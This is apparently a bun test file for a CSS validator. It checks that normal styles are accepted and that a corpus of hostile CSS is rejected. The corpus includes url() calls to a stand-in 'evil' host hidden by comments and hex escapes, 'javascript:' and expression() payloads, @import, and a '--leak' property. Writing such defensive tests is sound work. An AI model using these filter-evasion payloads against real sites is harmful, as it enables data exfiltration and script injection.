import {describe, expect, it} from 'bun:test';
import {
  validateStylesheet,
  validateStyleObject,
  normalizeCssValue,
  CssViolation,
} from '../src/host/css-validator';

describe('CSS validator — legitimate styles pass', () => {
  it('accepts ordinary layout/typography/animation CSS', () => {
    expect(() =>
      validateStylesheet(`
        .card { display: flex; gap: 12px; color: #123; padding: 1rem; border-radius: 8px; }
        @media (min-width: 600px) { .card { gap: 24px; } }
        @keyframes pulse { from { opacity: .4 } to { opacity: 1 } }
        .pulse { animation: pulse 1s ease-in-out infinite; transform: translateX(4px); }
        @container (min-width: 300px) { .card { flex-direction: row; } }
      `),
    ).not.toThrow();
  });

  it('accepts safe inline style objects', () => {
    expect(() =>
      validateStyleObject({display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', color: 'rebeccapurple', gap: 8}),
    ).not.toThrow();
  });
});

describe('CSS validator — URL-obfuscation hostile corpus', () => {
  const hostile: Array<[string, string]> = [
    ['plain url', '.x { background: url(http://evil/c) }'],
    ['protocol-relative', '.x { background: url(//evil/c) }'],
    ['data uri', '.x { background: url(data:image/png;base64,AAAA) }'],
    ['quoted url with spaces', ".x { background: url( 'http://evil/c' ) }"],
    ['inline comment split', '.x { background: ur/**/l(http://evil/c) }'],
    ['hex escape in function', '.x { background: \\75 rl(http://evil/c) }'],
    ['hex escape no-space', '.x { background: \\000075rl(http://evil/c) }'],
    ['image-set', '.x { background-image: image-set("http://evil/c" 1x) }'],
    ['-webkit-image-set', '.x { background-image: -webkit-image-set(url(http://evil/c) 1x) }'],
    ['cross-fade', '.x { background: cross-fade(url(http://evil/c), red) }'],
    ['css element() ref', '.x { background: element(#evil) }'],
    ['IE expression', '.x { width: expression(alert(1)) }'],
    ['paint worklet', '.x { background: paint(evil) }'],
    ['scheme in value', '.x { cursor: url(javascript:alert(1)), auto }'],
    ['@import', '@import url(http://evil/c);'],
    ['@font-face src', '@font-face { font-family: x; src: url(http://evil/c) }'],
    ['behavior property', '.x { behavior: url(http://evil/c.htc) }'],
    ['-moz-binding', '.x { -moz-binding: url(http://evil/c) }'],
  ];

  for (const [name, css] of hostile) {
    it(`rejects: ${name}`, () => {
      expect(() => validateStylesheet(css)).toThrow(CssViolation);
    });
  }

  it('rejects url-bearing inline style values (incl. escapes)', () => {
    expect(() => validateStyleObject({background: 'url(http://evil/c)'})).toThrow(CssViolation);
    expect(() => validateStyleObject({background: '\\75 rl(http://evil/c)'})).toThrow(CssViolation);
    expect(() => validateStyleObject({'--leak': 'url(http://evil/c)'})).toThrow(CssViolation);
  });

  it('normalizeCssValue decodes comments and escapes', () => {
    expect(normalizeCssValue('ur/**/l(x)')).toBe('url(x)');
    expect(normalizeCssValue('\\75 rl(x)')).toBe('url(x)');
    expect(normalizeCssValue('\\000075rl(x)')).toBe('url(x)');
  });
});
